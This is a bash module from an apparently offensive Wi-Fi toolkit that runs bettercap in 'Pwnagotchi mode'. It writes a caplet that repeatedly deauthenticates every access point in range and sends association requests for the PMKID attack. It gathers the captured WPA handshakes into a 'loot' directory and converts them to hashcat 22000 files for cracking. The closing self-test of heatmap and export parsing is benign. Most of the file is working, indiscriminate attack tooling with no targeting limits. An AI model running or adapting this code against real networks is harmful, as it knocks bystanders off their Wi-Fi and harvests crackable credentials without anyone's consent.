# Pwnagotchi mode — wardriving that hunts WPA/PMKID handshakes with bettercap
# ══════════════════════════════════════════════════════════════════════════
# bettercap does the work; this module generates its caplet, starts it
# detached, and reports what it collected. Nothing here claims a handshake
# was cracked or even captured until a capture file with usable key material
# actually exists on disk.

# Read one key out of the generated API env file (never printed by --status).
ward_pwn_env_get() {   # KEY
    [[ -f "$WARD_PWN_ENV" ]] || return 1
    awk -F'=' -v k="$1" '$1==k {print substr($0, length(k)+2); exit}' "$WARD_PWN_ENV"
}

ward_pwn_gen_pass() {
    od -An -tx1 -N12 /dev/urandom 2>/dev/null | tr -d ' \n'
}

# bettercap 2.32 has no wifi.pmkid.file parameter: PMKIDs go into
# wifi.handshakes.file with the 4-way handshakes. Its caplet evaluator stops
# at the FIRST line it cannot run, so a build without the parameter would
# abort the caplet before recon ever started — the generated caplet therefore
# keeps that setting last (see ward_pwn_write_caplet).
#
# There is no way to list parameters before the wifi module is loaded, so the
# installed binary is probed for the parameter name. A missing string is
# conclusive (parameter names live in the binary); a present string is taken
# as support.
ward_pwn_pmkid_param_supported() {
    local bc
    bc=$(command -v bettercap 2>/dev/null) || return 1
    [[ -n "$bc" ]] || return 1
    grep -qa 'wifi\.pmkid\.file' "$bc" 2>/dev/null
}

# ── interface gate ──
ward_pwn_iface_type() {   # IFACE -> monitor|managed|... (empty when unknown)
    iw dev "$1" info 2>/dev/null | awk '/^[[:space:]]*type /{print $2; exit}'
}

# True when the interface is already in monitor mode, or its phy can do it
# (bettercap switches it itself). Anything else cannot work and is refused.
ward_pwn_iface_monitor_capable() {   # IFACE
    local iface="$1" phy
    [[ "$(ward_pwn_iface_type "$iface")" == "monitor" ]] && return 0
    phy=$(iw dev "$iface" info 2>/dev/null | awk '/wiphy/{print "phy" $2; exit}')
    [[ -n "$phy" ]] || return 1
    iw phy "$phy" info 2>/dev/null | awk '
        /Supported interface modes/ { inlist = 1; next }
        inlist && $1 == "*" && $2 == "monitor" { found = 1 }
        inlist && /^[^[:space:]]/ { inlist = 0 }
        END { exit(found ? 0 : 1) }'
}

ward_pwn_resolve_iface() {   # [IFACE] -> interface on stdout
    local want="${1:-}"
    if [[ -n "$want" ]]; then printf '%s\n' "$want"; return 0; fi
    if [[ -n "${MON_IFACE:-}" ]]; then printf '%s\n' "$MON_IFACE"; return 0; fi
    if [[ -f "$TMP_DIR/mon_iface" ]]; then cat "$TMP_DIR/mon_iface"; return 0; fi
    iw dev 2>/dev/null | awk '
        /Interface/ { iface = $2 }
        /type monitor/ { print iface; exit }'
}

# Refuse by name: the message says which interface failed and why, because
# "no monitor interface" alone gives the operator nothing to act on.
ward_pwn_check_iface() {   # IFACE
    local iface="$1" type
    if [[ -z "$iface" ]]; then
        printf 'ERROR\tno monitor-capable interface: pass one (--pwn-start IFACE), set MON_IFACE, or create one with 01_iface\n' >&2
        return 1
    fi
    if [[ ! -d "/sys/class/net/$iface" ]]; then
        printf 'ERROR\tinterface %s does not exist\n' "$iface" >&2
        return 1
    fi
    type=$(ward_pwn_iface_type "$iface")
    [[ "$type" == "monitor" ]] && return 0
    ward_pwn_iface_monitor_capable "$iface" && return 0
    printf 'ERROR\tinterface %s is not monitor-capable (current type: %s, phy advertises no monitor mode)\n' \
        "$iface" "${type:-unknown}" >&2
    printf 'HINT\tbettercap needs monitor mode and injection; put %s into monitor mode with 01_iface first\n' \
        "$iface" >&2
    return 1
}

# ── caplet + API credentials ──
ward_pwn_write_caplet() {   # IFACE -> writes caplet and api env
    local iface="$1" user="" pass=""

    mkdir -p "$WARD_PWN_DIR" "$WARD_PWN_OUT" 2>/dev/null || {
        printf 'ERROR\tcannot create %s\n' "$WARD_PWN_DIR" >&2; return 1; }
    chmod 700 "$WARD_PWN_DIR" 2>/dev/null

    # Reuse the credentials across restarts so a bookmarked API URL keeps
    # working; generate a fresh password only the first time.
    user=$(ward_pwn_env_get api_user 2>/dev/null)
    pass=$(ward_pwn_env_get api_pass 2>/dev/null)
    [[ -n "$user" ]] || user="wifisting"
    [[ -n "$pass" ]] || pass=$(ward_pwn_gen_pass)
    [[ -n "$pass" ]] || { printf 'ERROR\tcould not generate an API password\n' >&2; return 1; }

    printf 'api_user=%s\napi_pass=%s\napi_port=%s\n' "$user" "$pass" "$WARD_PWN_PORT" \
        > "$WARD_PWN_ENV" || return 1
    chmod 600 "$WARD_PWN_ENV" 2>/dev/null

    cat > "$WARD_PWN_CAPLET" <<EOF
# wifisting — Pwnagotchi-mode wardriving caplet for bettercap
# Generated $(date -Iseconds 2>/dev/null || date) by modules/09_wardrive.sh --pwn-start.
# Rewritten on every start: edit the module, not this file.
#
# bettercap's caplet evaluator stops at the first line it cannot run, so
# every setting is applied before the commands that start a module.

# --- radio and capture output ---
set wifi.interface $iface
set wifi.handshakes.file $WARD_PWN_OUT/handshakes.pcap
set wifi.handshakes.aggregate true

# --- hunt WPA/PMKID only; leave open networks alone ---
set wifi.assoc.open false
set wifi.deauth.open false

# --- REST API: how the operator watches the hunt ---
set api.rest.address 127.0.0.1
set api.rest.port $WARD_PWN_PORT
set api.rest.username $user
set api.rest.password $pass

# --- recon on, then the hunting loop ---
# wifi.recon captures handshakes/PMKIDs passively as they happen.
wifi.recon on
api.rest on

# Every $WARD_PWN_HUNT_PERIOD seconds: association requests to every AP for
# the clientless RSN PMKID attack, and a deauth burst to force a 4-way
# handshake. This is the aggressive part of the mode.
set ticker.period $WARD_PWN_HUNT_PERIOD
set ticker.commands "wifi.deauth *; wifi.assoc *"
ticker on

# --- PMKID output file ---
# NOTE: bettercap 2.32 has no wifi.pmkid.file parameter; PMKIDs are written
# into wifi.handshakes.file above. The setting is kept, and kept LAST, so on
# a build that rejects it the caplet loses one setting instead of aborting
# before wifi.recon on. On a build that supports it, it takes effect here.
set wifi.pmkid.file $WARD_PWN_OUT/pmkid.pcap
EOF
    chmod 600 "$WARD_PWN_CAPLET" 2>/dev/null
    return 0
}

# ── pidfile helpers ──
# Liveness is decided by /proc, never by `kill -0`: a bettercap started as
# root returns EPERM to an unprivileged caller and `kill -0` would call that
# "not running" (this bug has already bitten this tree).
ward_pwn_pidfile_read() {
    local pid=""
    [[ -f "$WARD_PWN_PID" ]] && pid=$(tr -dc '0-9' < "$WARD_PWN_PID" 2>/dev/null)
    [[ "$pid" =~ ^[0-9]+$ ]] && printf '%s\n' "$pid"
    return 0
}

ward_pwn_running() {   # 0 when the pidfile points at a live process
    local pid
    pid=$(ward_pwn_pidfile_read)
    [[ -n "$pid" && -d "/proc/$pid" ]]
}

ward_pwn_uptime() {   # PID -> whole seconds (empty when unknown)
    local pid="$1" ticks hz boot
    # comm can contain spaces and parentheses, so strip pid + comm first.
    ticks=$(sed 's/^[0-9]* (.*) //' "/proc/$pid/stat" 2>/dev/null | awk '{print $20}')
    [[ "$ticks" =~ ^[0-9]+$ ]] || return 1
    hz=$(getconf CLK_TCK 2>/dev/null)
    [[ "$hz" =~ ^[0-9]+$ ]] || hz=100
    boot=$(awk '{print int($1)}' /proc/uptime 2>/dev/null)
    [[ "$boot" =~ ^[0-9]+$ ]] || return 1
    printf '%s\n' $(( boot - ticks / hz ))
}

# Count what is actually on disk in the output dir, using the same converter
# the rest of the tree uses: hcxpcapngtool writes a hashcat 22000 file whose
# WPA*02 records are EAPOL 4-way pairs and WPA*01 records are PMKIDs. That
# makes "handshakes" here mean the same thing it means in 08/18.
# Output: pcaps<TAB>handshakes<TAB>pmkids<TAB>method
ward_pwn_count_hashes() {   # [OUTDIR]
    local dir="${1:-$WARD_PWN_OUT}" f tmp
    local pcaps=0 hs=0 pm=0 method="none"
    local -a files=()

    for f in "$dir"/*.pcap "$dir"/*.cap; do
        [[ -f "$f" ]] && files+=("$f")
    done
    pcaps=${#files[@]}

    if command -v hcxpcapngtool >/dev/null 2>&1; then
        method="hcxpcapngtool"
        mkdir -p "$WARD_PWN_DIR" 2>/dev/null
        for f in "${files[@]}"; do
            tmp="$WARD_PWN_DIR/.count.$$.22000"
            rm -f "$tmp"
            timeout 20 hcxpcapngtool -o "$tmp" "$f" >/dev/null 2>&1
            if [[ -s "$tmp" ]]; then
                hs=$(( hs + $(ward_pwn_count_lines '^WPA\*02' "$tmp") ))
                pm=$(( pm + $(ward_pwn_count_lines '^WPA\*01' "$tmp") ))
            fi
            rm -f "$tmp"
        done
    fi
    printf '%s\t%s\t%s\t%s\n' "$pcaps" "$hs" "$pm" "$method"
}

# bettercap's session loop treats stdin EOF as "quit?", so a detached
# instance with stdin on /dev/null spins on the exit prompt. Hold the write
# end of a fifo open for exactly as long as bettercap lives.
#
# The fifo itself must exist BEFORE bettercap is launched: the shell performs
# the `< fifo` redirect before exec, so a missing file means the child dies
# without ever running bettercap (and without even creating the log).
ward_pwn_fifo_make() {
    [[ -p "$WARD_PWN_FIFO" ]] && return 0
    mkdir -p "$WARD_PWN_DIR" 2>/dev/null
    rm -f "$WARD_PWN_FIFO"
    mkfifo -m 600 "$WARD_PWN_FIFO" 2>/dev/null || return 1
    return 0
}

ward_pwn_fifo_hold() {   # BETTERCAP_PID
    local bc_pid="$1"
    ward_pwn_fifo_make || return 1
    setsid bash -c 'exec 9>"$1"; while [[ -d "/proc/$2" ]]; do sleep 2; done' \
        _ "$WARD_PWN_FIFO" "$bc_pid" >/dev/null 2>&1 &
    printf '%s\n' "$!" > "$WARD_PWN_HOLDER"
}

ward_pwn_holder_stop() {
    local h=""
    [[ -f "$WARD_PWN_HOLDER" ]] && h=$(tr -dc '0-9' < "$WARD_PWN_HOLDER" 2>/dev/null)
    if [[ "$h" =~ ^[0-9]+$ && -d "/proc/$h" ]]; then
        stop_kill_pid "$h" >/dev/null 2>&1
    fi
    rm -f "$WARD_PWN_HOLDER" "$WARD_PWN_FIFO"
    return 0
}

# A bettercap holding our caplet is ours even when the pidfile was lost.
# stop_sweep() cannot answer "did that reap anything" (it returns 0 both when
# it killed a process and when nothing matched), so the matches are counted
# before the sweep and checked afterwards.
ward_pwn_sweep_stray() {
    local sp gone=0
    local -a before=()
    mapfile -t before < <(pgrep -f "bettercap .*-caplet $WARD_PWN_CAPLET" 2>/dev/null)
    ((${#before[@]})) || return 1
    stop_sweep "bettercap .*-caplet $WARD_PWN_CAPLET" || true
    for sp in "${before[@]}"; do
        [[ -d "/proc/$sp" ]] && continue
        gone=1
    done
    (( gone ))
}

# grep -c prints the count and exits 1 when that count is zero, so the usual
# `$(grep -c ... || echo 0)` yields TWO lines ("0\n0") and breaks arithmetic
# and string comparisons. This always returns exactly one number.
ward_pwn_count_lines() {   # PATTERN FILE
    local n
    n=$(grep -c -- "$1" "$2" 2>/dev/null | head -1)
    [[ "$n" =~ ^[0-9]+$ ]] || n=0
    printf '%s\n' "$n"
}

# ── --pwn-start ──
# The port this instance actually bound, as recorded in api.env.
ward_pwn_api_port() {
    local p
    p=$(ward_pwn_env_get api_port 2>/dev/null)
    if [[ "$p" =~ ^[0-9]+$ ]]; then printf '%s\n' "$p"; else printf '%s\n' "$WARD_PWN_PORT"; fi
}

# bettercap's api.rest loses the bind silently when something else already
# holds the port, and a bettercap with no credentials configured answers ANY
# request -- so "the port answers" is not proof that it is our instance
# answering. Pick a port that is demonstrably free before writing the caplet.
ward_pwn_port_free() {   # PORT
    local port="$1"
    if command -v ss >/dev/null 2>&1; then
        [[ -z "$(ss -Hltn "sport = :$port" 2>/dev/null)" ]]
        return $?
    fi
    ! timeout 1 bash -c "exec 3<>/dev/tcp/127.0.0.1/$port" 2>/dev/null
}

ward_pwn_pick_port() {   # BASE -> first free port on stdout
    local port="$1" i=0
    while (( i <= 10 )); do
        if ward_pwn_port_free "$port"; then printf '%s\n' "$port"; return 0; fi
        port=$(( port + 1 )); i=$(( i + 1 ))
    done
    return 1
}

# Ask bettercap's own REST API whether it is really up. A live pid proves
# nothing: bettercap logs a failed caplet and then keeps its session at the
# prompt with no wifi module and no API, which looks identical to a healthy
# start from the outside. Returns an HTTP status code, or "open" when only
# the TCP port could be checked, or nothing when there is no answer.
ward_pwn_api_probe() {   # USER PASS
    local user="$1" pass="$2" port
    port=$(ward_pwn_api_port)
    local url="http://127.0.0.1:$port/api/session"
    if command -v curl >/dev/null 2>&1; then
        curl -s -o /dev/null -u "$user:$pass" --max-time 2 -w '%{http_code}' "$url" 2>/dev/null
        return 0
    fi
    if timeout 2 bash -c "exec 3<>/dev/tcp/127.0.0.1/$port" 2>/dev/null; then
        printf 'open\n'
    fi
    return 0
}

wardrive_cli_pwn_start() {
    local iface
    iface=$(ward_pwn_resolve_iface "${1:-}")
    ward_pwn_check_iface "$iface" || return 1
    command -v bettercap >/dev/null 2>&1 || {
        printf 'ERROR\tbettercap is not installed\n' >&2; return 1; }

    if ward_pwn_running; then
        printf 'ERROR\tbettercap already running (pid %s) — run --pwn-stop first\n' \
            "$(ward_pwn_pidfile_read)" >&2
        return 1
    fi

    local port
    if ! port=$(ward_pwn_pick_port "$WARD_PWN_PORT"); then
        printf 'ERROR\tno free API port in %s..%s — is another bettercap already listening?\n' \
            "$WARD_PWN_PORT" "$(( WARD_PWN_PORT + 10 ))" >&2
        return 1
    fi
    if [[ "$port" != "$WARD_PWN_PORT" ]]; then
        printf 'NOTE\tAPI port %s is already in use; this instance uses %s\n' \
            "$WARD_PWN_PORT" "$port"
        WARD_PWN_PORT="$port"
    fi

    ward_pwn_write_caplet "$iface" || return 1
    ward_pwn_fifo_make || {
        printf 'ERROR\tcannot create %s\n' "$WARD_PWN_FIFO" >&2; return 1; }

    info "starting bettercap in pwnagotchi mode on $iface"
    setsid bettercap -no-colors -iface "$iface" -caplet "$WARD_PWN_CAPLET" \
        < "$WARD_PWN_FIFO" > "$WARD_PWN_LOG" 2>&1 &
    local bc_pid=$!
    # ${BASHPID:-$$} is the fallback: under a subshell $$ is the parent pid.
    printf '%s\n' "${bc_pid:-${BASHPID:-$$}}" > "$WARD_PWN_PID"
    ward_pwn_fifo_hold "$bc_pid" || warn "could not hold bettercap stdin open"

    sleep 2
    if [[ ! -d "/proc/$bc_pid" ]]; then
        printf 'ERROR\tbettercap exited immediately — see %s\n' "$WARD_PWN_LOG" >&2
        tail -5 "$WARD_PWN_LOG" 2>/dev/null | sed 's/^/\t/' >&2
        rm -f "$WARD_PWN_PID"
        ward_pwn_holder_stop
        return 1
    fi

    local user pass pmkid_support
    user=$(ward_pwn_env_get api_user)
    pass=$(ward_pwn_env_get api_pass)

    # A live pid is not a running hunt. bettercap logs a failed caplet and
    # then sits at its prompt with no wifi module and no REST API, which looks
    # exactly like a healthy start from the outside. So: the caplet must not
    # have errored, and the API must answer.
    local i code="" caplet_err="" api_ok=0
    for i in 1 2 3 4 5 6 7 8 9 10; do
        [[ -d "/proc/$bc_pid" ]] || break
        code=$(ward_pwn_api_probe "$user" "$pass")
        if [[ "$code" == "200" || "$code" == "open" ]]; then api_ok=1; break; fi
        # A caplet error with no API after two tries does not fix itself.
        if (( i >= 2 )) && grep -q 'error while running caplet' "$WARD_PWN_LOG" 2>/dev/null; then
            break
        fi
        sleep 1
    done
    caplet_err=$(ward_pwn_count_lines 'error while running caplet' "$WARD_PWN_LOG")

    if [[ "$caplet_err" != "0" || "$api_ok" != "1" ]]; then
        printf 'ERROR\tbettercap (pid %s) did not come up: caplet_errors=%s api=%s — the hunt is NOT running\n' \
            "$bc_pid" "$caplet_err" "${code:-no-answer}" >&2
        grep -m1 'error while running caplet' "$WARD_PWN_LOG" 2>/dev/null | sed 's/^/\t/' >&2
        printf '\tsee %s\n' "$WARD_PWN_LOG" >&2
        # Reap what we started: a bettercap that could not apply the caplet
        # only holds the interface.
        stop_kill_pid "$bc_pid" >/dev/null 2>&1
        rm -f "$WARD_PWN_PID"
        ward_pwn_holder_stop
        return 1
    fi

    if ward_pwn_pmkid_param_supported; then pmkid_support="supported"; else pmkid_support="unsupported"; fi

    printf 'STARTED\t%s\n'          "$bc_pid"
    printf 'IFACE\t%s\n'            "$iface"
    printf 'CAPLET\t%s\n'           "$WARD_PWN_CAPLET"
    printf 'OUT\t%s\n'              "$WARD_PWN_OUT"
    printf 'LOG\t%s\n'              "$WARD_PWN_LOG"
    printf 'API\thttp://127.0.0.1:%s/api/\n' "$(ward_pwn_api_port)"
    printf 'API_USER\t%s\n'         "$user"
    printf 'API_PASS\t%s\n'         "$pass"
    printf 'API_PASS_FILE\t%s\n'    "$WARD_PWN_ENV"
    printf 'WATCH\tcurl -s -u %s:%s http://127.0.0.1:%s/api/session\n' "$user" "$pass" "$(ward_pwn_api_port)"
    printf 'NOTE\tbettercap verifies nothing on your behalf: check --pwn-status-tsv for files on disk before believing a hunt worked.\n'
    printf 'VERIFY\tREST API answered on 127.0.0.1:%s; that the hunt is actually finding anything is for --pwn-status-tsv to show, not this line.\n' "$(ward_pwn_api_port)"
    if [[ "$pmkid_support" == "unsupported" ]]; then
        printf 'NOTE\tthis bettercap build has no wifi.pmkid.file parameter, so PMKIDs land in wifi.handshakes.file; the setting is kept last in the caplet and rejected harmlessly.\n'
    fi
    return 0
}

# ── --pwn-stop (idempotent) ──
wardrive_cli_pwn_stop() {
    local pid="" killed=0
    pid=$(ward_pwn_pidfile_read)
    if [[ -n "$pid" && -d "/proc/$pid" ]]; then
        if stop_kill_pid "$pid"; then
            killed=1
            rm -f "$WARD_PWN_PID"
        else
            printf 'ERROR\tbettercap pid %s survived SIGKILL (pidfile kept)\n' "$pid" >&2
            return 1
        fi
    else
        # Nothing live behind the pidfile: drop it and report not-running.
        rm -f "$WARD_PWN_PID"
    fi
    # A bettercap started outside the pidfile but running our caplet is ours.
    ward_pwn_sweep_stray && killed=1
    ward_pwn_holder_stop
    printf 'STOPPED\t%s\n' "$killed"
    return 0
}

# ── --pwn-status-tsv ──
wardrive_cli_pwn_status_tsv() {
    local pid="" running=0 up="" counts pcaps hs pm method
    pid=$(ward_pwn_pidfile_read)
    if [[ -n "$pid" && -d "/proc/$pid" ]]; then
        running=1
        up=$(ward_pwn_uptime "$pid" 2>/dev/null)
    fi
    counts=$(ward_pwn_count_hashes "$WARD_PWN_OUT")
    IFS=$'\t' read -r pcaps hs pm method <<<"$counts"

    local pmkid_support="unknown"
    if command -v bettercap >/dev/null 2>&1; then
        if ward_pwn_pmkid_param_supported; then pmkid_support="supported"; else pmkid_support="unsupported"; fi
    fi

    printf 'running\t%s\n'      "$running"
    printf 'pid\t%s\n'          "$pid"
    printf 'uptime_s\t%s\n'     "${up:-}"
    printf 'iface\t%s\n'        "$(ward_pwn_resolve_iface 2>/dev/null)"
    printf 'caplet\t%s\n'       "$WARD_PWN_CAPLET"
    printf 'out_dir\t%s\n'      "$WARD_PWN_OUT"
    printf 'pcaps\t%s\n'        "$pcaps"
    printf 'handshakes\t%s\n'   "$hs"
    printf 'pmkids\t%s\n'       "$pm"
    printf 'count_method\t%s\n' "$method"
    printf 'pmkid_param\t%s\n'  "$pmkid_support"
    printf 'api\thttp://127.0.0.1:%s/api/\n' "$(ward_pwn_api_port)"
    printf 'api_user\t%s\n'     "$(ward_pwn_env_get api_user 2>/dev/null)"
    printf 'api_pass_file\t%s\n' "$WARD_PWN_ENV"
    printf 'log\t%s\n'          "$WARD_PWN_LOG"
    return 0
}

# ── --pwn-export ──
# Copies what bettercap collected into the wardrive loot dir: the pcaps as
# they are, plus one hashcat 22000 file the rest of the tree can feed to
# hashcat. Adds files under a fresh timestamped directory; never rewrites or
# deletes anything already in the loot tree.
wardrive_cli_pwn_export() {
    local dir="${1:-$WARD_PWN_OUT}"
    local -a files=()
    local f dest n=0 hs=0 pm=0 method="none" hashfile=""

    for f in "$dir"/*.pcap "$dir"/*.cap; do
        [[ -f "$f" ]] && files+=("$f")
    done
    if (( ${#files[@]} == 0 )); then
        printf 'ERROR\tnothing to export: no .pcap in %s (run --pwn-start first)\n' "$dir" >&2
        return 1
    fi

    dest="$WARD_PWN_LOOT/pwn_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$dest" 2>/dev/null || {
        printf 'ERROR\tcannot create %s\n' "$dest" >&2; return 1; }

    for f in "${files[@]}"; do
        if cp -p "$f" "$dest/$(basename "$f")" 2>/dev/null; then n=$((n+1)); fi
    done
    if (( n == 0 )); then
        printf 'ERROR\tno capture could be copied into %s\n' "$dest" >&2
        return 1
    fi

    if command -v hcxpcapngtool >/dev/null 2>&1; then
        method="hcxpcapngtool"
        hashfile="$dest/handshakes.22000"
        timeout 120 hcxpcapngtool -o "$hashfile" "${files[@]}" >/dev/null 2>&1
        if [[ -s "$hashfile" ]]; then
            hs=$(ward_pwn_count_lines '^WPA\*02' "$hashfile")
            pm=$(ward_pwn_count_lines '^WPA\*01' "$hashfile")
        else
            rm -f "$hashfile"   # an empty file is not a hash file
            hashfile=""
        fi
    fi

    printf 'LOOT\t%s\n'         "$dest"
    printf 'PCAPS\t%s\n'        "$n"
    printf 'HASHFILE\t%s\n'     "$hashfile"
    printf 'HANDSHAKES\t%s\n'   "$hs"
    printf 'PMKIDS\t%s\n'       "$pm"
    printf 'COUNT_METHOD\t%s\n' "$method"
    if (( hs + pm == 0 )); then
        printf 'NOTE\tno usable key material yet: the pcaps are copied, but hcxpcapngtool found no EAPOL pair or PMKID to write.\n'
    fi
    return 0
}

wardrive_cli_info() {
    cat <<'INFO'
Wardriving (09_wardrive) — GPS-tagged Wi-Fi scanning plus Pwnagotchi mode.

Scanning (Kismet):
  --start / --stop            Kismet with GPS tagging; KML/GPX/WiGLE export
  --gps-quality-tsv            satellites, HDOP, fix type from gpsd
  --heatmap [LOG] [OUT]        density map (matplotlib PNG, else SVG)

Pwnagotchi mode — active WPA/PMKID hunting with bettercap:
  --pwn-start [IFACE]          start bettercap detached with a recon +
                               handshake/PMKID caplet, and print the REST
                               API endpoint and credentials so you can watch
                               it. Requires a monitor-capable interface and
                               is refused by name when there is none.
  --pwn-stop                   reap bettercap, its stdin holder and the
                               pidfile. Idempotent: exits 0 when nothing is
                               running.
  --pwn-status-tsv             running, pid, uptime, interface, caplet path,
                               capture files, handshakes and PMKIDs on disk
                               (counted with hcxpcapngtool), API endpoint.
  --pwn-export                 copy the collected .pcap files into the
                               wardrive loot dir and convert them to one
                               hashcat .22000 file. Adds new files only.

What the hunt actually does: wifi.recon captures handshakes and PMKIDs as
they occur, and a ticker every 60s sends wifi.deauth * plus wifi.assoc * to
force 4-way handshakes and clientless PMKID responses from WPA/WPA2 APs.
Open networks are left alone (wifi.assoc.open / wifi.deauth.open are off).

Honesty notes:
  * bettercap cannot confirm that a handshake or PMKID was captured until a
    file on disk contains it: --pwn-status-tsv counts real records, and
    --pwn-export says so when there is no usable key material.
  * bettercap 2.32 has no wifi.pmkid.file parameter; PMKIDs are written into
    wifi.handshakes.file. The generated caplet keeps that setting last so a
    build that rejects it cannot abort wifi.recon on.
  * The API listens on 127.0.0.1 only, with credentials written to
    tmp/wardrive_pwn/api.env (mode 600).
INFO
}

# ── self-test ────────────────────────────────────────────────────────────
# Offline only: no GPS, no gpsd, no radio, no network, no root. Everything
# is exercised on synthetic logs written under $TMP_DIR; the real
# captures/wardrive tree is never read or written.
wardrive_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad+1)); fi
    }
    wfld() { awk -F'\t' -v k="$1" '$1==k {print $2; exit}'; }

    # Unique scratch dir per run. The fixed path this used to build collided
    # with a concurrent run of the same selftest (tools/run-selftests.sh in
    # another shell): each run wiped the other's fixtures and the heatmap
    # checks failed with files that had just been written.
    local MOD_TMP
    MOD_TMP=$(mktemp -d "$TMP_DIR/wardrive_selftest.XXXXXX") || {
        printf 'ERROR\tcannot create scratch under %s\n' "$TMP_DIR" >&2; return 1; }
    local save_wd="$WARDRIVE_DIR"
    WARDRIVE_DIR="$MOD_TMP"

    # ── WiGLE CSV -> heatmap points ──
    cat > "$MOD_TMP/test.wiglecsv" <<'CSV'
WigleWifi-1.4,appRelease=wifisting,model=selftest
MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type
AA:BB:CC:DD:EE:01,Home Net,[WPA2][ESS],2020-01-01 00:00:00,6,-45,52.100000,4.200000,10.0,5.0,WIFI
AA:BB:CC:DD:EE:02,,[WPA2][ESS],2020-01-01 00:00:01,11,-70,52.200000,4.300000,11.0,5.0,WIFI
AA:BB:CC:DD:EE:03,NoFix,[ESS],2020-01-01 00:00:02,1,-80,0,0,0,0,WIFI
AA:BB:CC:DD:EE:04,Bob & Alice <Net>,[WPA2][ESS],2020-01-01 00:00:03,1,-88,52.300000,4.400000,0,5.0,WIFI
CSV
    local n
    n=$(wardrive_heatmap_points "$MOD_TMP/test.wiglecsv" "$MOD_TMP/p.pts")
    chk wigle-point-count "$n" "3"
    chk wigle-point-1 "$(sed -n 1p "$MOD_TMP/p.pts")" "52.100000 4.200000 -45 Home_Net"
    # An empty SSID becomes (hidden); the row with no GPS fix is dropped.
    chk wigle-point-hidden "$(sed -n 2p "$MOD_TMP/p.pts")" "52.200000 4.300000 -70 (hidden)"
    chk wigle-point-spaces "$(sed -n 3p "$MOD_TMP/p.pts")" "52.300000 4.400000 -88 Bob_&_Alice_<Net>"

    # ── Kismet CSV -> heatmap points (header-mapped, not positional) ──
    cat > "$MOD_TMP/test.kismet" <<'CSV'
BSSID,SSID,Latitude,Longitude,Signal
AA:BB:CC:DD:EE:01,Net One,52.100000,4.200000,-50
AA:BB:CC:DD:EE:02,Cafe,52.150000,4.250000,-71
CSV
    n=$(wardrive_heatmap_points "$MOD_TMP/test.kismet" "$MOD_TMP/k.pts")
    chk kismet-point-count "$n" "2"
    chk kismet-point-1 "$(sed -n 1p "$MOD_TMP/k.pts")" "52.100000 4.200000 -50 Net_One"
    chk kismet-point-2 "$(sed -n 2p "$MOD_TMP/k.pts")" "52.150000 4.250000 -71 Cafe"

    # ── unknown extension must be refused, not silently parsed ──
    local rc=0
    wardrive_heatmap_points "$MOD_TMP/test.txt" "$MOD_TMP/x.pts" >/dev/null 2>&1 || rc=$?
    chk points-unknown-ext-rc "$rc" "1"

    # ── SVG fallback renderer: RSSI band -> colour ──
    wardrive_heatmap_svg "$MOD_TMP/p.pts" "$MOD_TMP/p.svg" "selftest"
    chk svg-rc "$?" "0"
    chk svg-exists "$([[ -s "$MOD_TMP/p.svg" ]] && echo yes || echo no)" "yes"
    # -45 is in the >= -50 band (#2fbf5f), -70 in the >= -75 band (#ffd60a);
    # each point draws a halo plus a core, so two hits per band.
    chk svg-colour-strong "$(grep -c '#2fbf5f' "$MOD_TMP/p.svg")" "2"
    chk svg-colour-mid "$(grep -c '#ffd60a' "$MOD_TMP/p.svg")" "2"
    chk svg-circles "$(grep -c '<circle' "$MOD_TMP/p.svg")" "6"

    # ── dispatcher: matplotlib when available, SVG otherwise ──
    local hm
    hm=$(wardrive_heatmap "$MOD_TMP/test.wiglecsv" "$MOD_TMP/hm.png" 2>/dev/null)
    chk heatmap-rc "$?" "0"
    chk heatmap-points "$(wfld POINTS <<<"$hm")" "3"
    chk heatmap-renderer "$(wfld RENDERER <<<"$hm")" \
        "$(python3 -c 'import matplotlib, numpy, scipy' 2>/dev/null && echo matplotlib || echo svg)"
    chk heatmap-output-exists "$([[ -s "$(wfld PNG <<<"$hm")$(wfld SVG <<<"$hm")" ]] && echo yes || echo no)" "yes"

    # A log with no GPS-tagged rows cannot be mapped.
    cat > "$MOD_TMP/nofix.wiglecsv" <<'CSV'
WigleWifi-1.4,appRelease=wifisting,model=selftest
MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type
AA:BB:CC:DD:EE:09,NoFix,[ESS],2020-01-01 00:00:00,1,-80,0,0,0,0,WIFI
CSV
    rc=0
    wardrive_heatmap "$MOD_TMP/nofix.wiglecsv" "$MOD_TMP/nofix.png" >/dev/null 2>&1 || rc=$?
    chk heatmap-nofix-rc "$rc" "1"

    # ── matplotlib label placement: strongest observation per SSID wins,
    #    and a label that collides with one already placed is dropped ──
    if python3 -c 'import matplotlib, numpy, scipy' 2>/dev/null; then
        cat > "$MOD_TMP/labels.pts" <<'PTS'
52.100000 4.200000 -30 AAA
52.100000 4.200001 -70 BBB
52.100000 4.200002 -80 CCC
52.200000 4.300000 -55 DDD
52.100000 4.200000 -35 AAA
PTS
        chk png-rc "$(wardrive_heatmap_png "$MOD_TMP/labels.pts" "$MOD_TMP/labels.png" labels >/dev/null 2>&1; echo $?)" "0"
        chk png-renderer-written "$([[ -s "$WARDRIVE_DIR/.heatmap_render.py" ]] && echo yes || echo no)" "yes"
        # Re-run the renderer the module itself emitted, recording every
        # annotate() call: AAA/BBB/CCC sit on top of each other, so only the
        # strongest of them (AAA) may be labelled, plus the distant DDD.
        local labels
        labels=$(python3 - "$WARDRIVE_DIR/.heatmap_render.py" "$MOD_TMP/labels.pts" \
                        "$MOD_TMP/labels2.png" "labels" <<'PY'
import contextlib, io, runpy, sys
import matplotlib
matplotlib.use("Agg")
import matplotlib.axes
seen = []
orig = matplotlib.axes.Axes.annotate
def rec(self, text, xy, *a, **k):
    seen.append(text)
    return orig(self, text, xy, *a, **k)
matplotlib.axes.Axes.annotate = rec
sys.argv = sys.argv[1:]
with contextlib.redirect_stdout(io.StringIO()):
    runpy.run_path(sys.argv[0], run_name="__main__")
print("|".join(seen))
PY
)
        chk labels-strongest-and-collision "$labels" "AAA|DDD"
    else
        printf 'labels-matplotlib\tSKIP (matplotlib not installed)\n'
    fi

    # ── GPX export: XML escaping, hidden SSID and <ele> suppression ──
    # The fixture is a canonical WiGLE file: a preamble line AND the column
